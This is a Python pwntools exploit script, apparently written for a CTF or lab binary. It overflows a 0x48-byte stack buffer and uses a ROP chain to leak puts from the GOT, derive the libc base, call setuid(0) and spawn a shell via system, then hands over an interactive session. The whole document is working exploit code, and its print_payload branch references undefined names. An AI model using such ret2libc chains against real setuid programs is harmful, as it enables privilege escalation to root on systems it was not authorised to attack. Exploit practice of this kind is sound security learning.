#!/bin/python

from pwn import * 
import sys

context.arch = 'amd64'

BUFFER_LEN=0x48

RDI = 0x4022b3

RET = 0x40101a
SYSTEM_OFF = 0x52290
STR = 0x1b45bd

PUTS_PLT = 0x401090
PUTS_GOT = 0x405020
PUTS_OFF = 0x84420


def puts_puts():
    return flat([
        RDI, PUTS_GOT, 
        PUTS_PLT
    ])


def do_system(libc):
    return flat([
        RET, # an extra ret to make stack 16 byte align
             # because MOVAPS
        RDI, libc + STR,
        libc + 0x522ab
    ])


def setuid(libc):
    return flat([
        RDI, 0,
        libc + 0xe4150
    ])


def get_payload(args, proc: process):
    payload =  cyclic(BUFFER_LEN)
    payload += puts_puts()
    payload += p64(0x402150)
    proc.send(payload)

    proc.readuntil(b"Leaving!\n")
    puts_addr = u64(proc.readline(drop=True).ljust(8, b'\x00'))

    libc_addr = puts_addr - PUTS_OFF
    print(f"Addr of libc: {hex(libc_addr)}")
    
    payload =  cyclic(BUFFER_LEN)
    payload += setuid(libc_addr)
    payload += do_system(libc_addr)

    return payload #+ b'X' * (0x1000 - len(payload)) + GOAL


def main():
    proc = process(sys.argv[1])
    proc.send(get_payload(None, proc))

    proc.interactive()


def print_payload():
    payload = get_payload(args, proc)[1:]
    print(payload + cyclic(0x1000 - len(payload)-1) + GOAL)


if __name__ == '__main__':
    if len(sys.argv) == 3:
        print_payload()
    else:
        main()
